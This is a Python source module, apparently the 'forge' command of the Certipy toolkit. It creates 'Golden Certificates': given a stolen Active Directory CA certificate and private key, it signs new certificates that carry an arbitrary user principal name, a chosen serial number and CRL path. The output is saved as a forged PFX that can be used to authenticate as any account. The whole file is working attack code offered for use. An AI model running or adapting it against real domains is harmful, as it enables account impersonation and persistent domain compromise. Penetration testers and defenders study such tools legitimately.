import argparse
import datetime
import logging
from typing import Callable, Tuple

from certipy.auth import cert_id_to_parts
from certipy.certificate import (
    PRINCIPAL_NAME,
    NameOID,
    UTF8String,
    create_pfx,
    encoder,
    generate_rsa_key,
    load_pfx,
    x509,
)

NAME = "forge"

DN_MAP = {
    "CN": NameOID.COMMON_NAME,
    "DC": NameOID.DOMAIN_COMPONENT,
    "OU": NameOID.ORGANIZATIONAL_UNIT_NAME,
}


def dn_to_components(dn):
    components = []
    component = ""
    escape_sequence = False
    for c in dn:
        if c == "\\":
            escape_sequence = True
        elif escape_sequence and c != " ":
            escape_sequence = False
        elif c == ",":
            if "=" in component:
                attr_name, _, value = component.partition("=")
                component = (attr_name.strip().upper(), value.strip())
                components.append(component)
                component = ""
                continue

        component += c

    attr_name, _, value = component.partition("=")
    component = (attr_name.strip(), value.strip())
    components.append(component)
    return components


class Forge:
    def __init__(
        self,
        ca_pfx: str = None,
        alt: str = None,
        template: str = None,
        subject: str = None,
        crl: str = None,
        serial: str = None,
        out: str = None,
        **kwargs
    ):
        self.ca_pfx = ca_pfx
        self.alt_name = alt
        self.template = template
        self.subject = subject
        self.serial = serial
        self.crl = crl
        self.out = out
        self.kwargs = kwargs

    def get_subject_from_str(self, subject: str = None) -> x509.Name:
        if subject is None:
            subject = self.subject

        components = []
        for component in dn_to_components(subject):
            if component[0] not in DN_MAP:
                logging.warning("%s component is not implemented" % repr(component[0]))
                continue

            components.append(x509.NameAttribute(DN_MAP[component[0]], component[1]))

        return x509.Name(components)

    def get_serial_number(self) -> int:
        serial_number = self.serial
        if serial_number is None:
            serial_number = x509.random_serial_number()
        else:
            serial_number = int(serial_number.replace(":", ""), 16)
        return serial_number

    def get_crl(self, crl: str = None) -> x509.CRLDistributionPoints:
        if crl is None:
            crl = self.crl
        if crl:
            return x509.CRLDistributionPoints(
                [
                    x509.DistributionPoint(
                        full_name=[x509.UniformResourceIdentifier(crl)],
                        relative_name=None,
                        reasons=None,
                        crl_issuer=None,
                    )
                ]
            )
        return None

    def forge(self):
        with open(self.ca_pfx, "rb") as f:
            ca_pfx = f.read()
        ca_key, ca_cert = load_pfx(ca_pfx)

        if self.template is not None:
            with open(self.template, "rb") as f:
                tmp_pfx = f.read()
            key, tmp_cert = load_pfx(tmp_pfx)

            subject = self.subject
            if subject is None:
                subject = tmp_cert.subject
            else:
                subject = self.get_subject_from_str()

            serial_number = self.serial
            if serial_number is None:
                serial_number = tmp_cert.serial_number
            else:
                serial_number = int(serial_number.replace(":", ""), 16)

            cert = x509.CertificateBuilder()
            cert = cert.subject_name(subject)
            cert = cert.issuer_name(ca_cert.subject)
            cert = cert.public_key(tmp_cert.public_key())
            cert = cert.serial_number(serial_number)
            cert = cert.not_valid_before(tmp_cert.not_valid_before)
            cert = cert.not_valid_after(tmp_cert.not_valid_after)

            cert = cert.add_extension(
                x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
                False,
            )

            skip_extensions = [
                x509.AuthorityKeyIdentifier.oid,
                x509.SubjectAlternativeName.oid,
                x509.ExtendedKeyUsage.oid,
            ]

            crl = self.get_crl()
            if crl is not None:
                skip_extensions.append(x509.CRLDistributionPoints.oid)
                cert = cert.add_extension(crl, False)

            extensions = tmp_cert.extensions
            for extension in extensions:
                if extension.oid in skip_extensions:
                    continue
                cert = cert.add_extension(extension.value, extension.critical)

            signature_hash_algorithm = tmp_cert.signature_hash_algorithm.__class__
        else:
            key = generate_rsa_key()

            subject = self.subject
            if subject is None:
                subject = self.get_subject_from_str(
                    "CN=%s" % cert_id_to_parts("UPN", self.alt_name)[0]
                )
            else:
                subject = self.get_subject_from_str()

            serial_number = self.serial
            if serial_number is None:
                serial_number = x509.random_serial_number()
            else:
                serial_number = int(serial_number.replace(":", ""), 16)

            cert = x509.CertificateBuilder()
            cert = cert.subject_name(subject)
            cert = cert.issuer_name(ca_cert.subject)
            cert = cert.public_key(key.public_key())
            cert = cert.serial_number(serial_number)
            cert = cert.not_valid_before(
                datetime.datetime.utcnow() - datetime.timedelta(days=1)
            )
            cert = cert.not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=365)
            )

            cert = cert.add_extension(
                x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
                False,
            )

            cert = cert.add_extension(
                x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
                False,
            )

            crl = self.get_crl()
            if crl is not None:
                cert = cert.add_extension(crl, False)

            signature_hash_algorithm = ca_cert.signature_hash_algorithm.__class__

        alt_name = encoder.encode(UTF8String(self.alt_name.encode()))
        cert = cert.add_extension(
            x509.SubjectAlternativeName(
                [
                    x509.OtherName(PRINCIPAL_NAME, alt_name),
                ]
            ),
            False,
        )

        cert = cert.sign(ca_key, signature_hash_algorithm())

        pfx = create_pfx(key, cert)

        out = self.out
        if not out:
            out, _ = cert_id_to_parts("UPN", self.alt_name)
            out = "%s_forged.pfx" % out.rstrip("$").lower()

        with open(out, "wb") as f:
            f.write(pfx)

        logging.info("Saved forged certificate and private key to %s" % repr(out))


def entry(options: argparse.Namespace) -> None:
    forge = Forge(
        **vars(options),
    )

    forge.forge()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(NAME, help="Create Golden Certificates")

    subparser.add_argument(
        "-ca-pfx",
        action="store",
        metavar="pfx/p12 file name",
        help="Path to CA certificate",
        required=True,
    )
    subparser.add_argument(
        "-alt", action="store", metavar="alternative UPN", required=True
    )
    subparser.add_argument(
        "-template",
        action="store",
        metavar="pfx/p12 file name",
        help="Path to template certificate",
    )
    subparser.add_argument(
        "-subject",
        action="store",
        metavar="subject",
        help="Subject to include certificate",
    )
    subparser.add_argument(
        "-crl",
        action="store",
        metavar="ldap path",
        help="ldap path to a CRL",
    )
    subparser.add_argument("-serial", action="store", metavar="serial number")
    subparser.add_argument("-debug", action="store_true", help="Turn debug output on")

    group = subparser.add_argument_group("output options")
    group.add_argument("-out", action="store", metavar="output file name")

    return NAME, entry
